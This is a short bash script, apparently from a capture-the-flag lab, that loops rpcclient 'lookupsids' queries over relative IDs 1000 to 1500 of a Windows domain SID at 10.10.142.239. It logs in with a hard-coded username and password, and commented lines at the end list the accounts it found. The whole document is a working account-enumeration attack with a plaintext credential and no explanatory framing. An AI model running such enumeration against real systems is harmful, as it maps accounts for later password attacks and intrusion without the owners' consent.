#!/bin/bash

sid="S-1-5-21-3981879597-1135670737-2718083060"

for i in `seq 1000 1500`; do
	rpcclient -U 'Bob%!P@$$W0rD!123' -c "lookupsids $sid-$i;quit" 10.10.142.239 | cut -d ' ' -f2 
done

#RELEVANT\Administrator
#RELEVANT\Guest
#RELEVANT\DefaultAccount
#RELEVANT\None
#RELEVANT\Bob
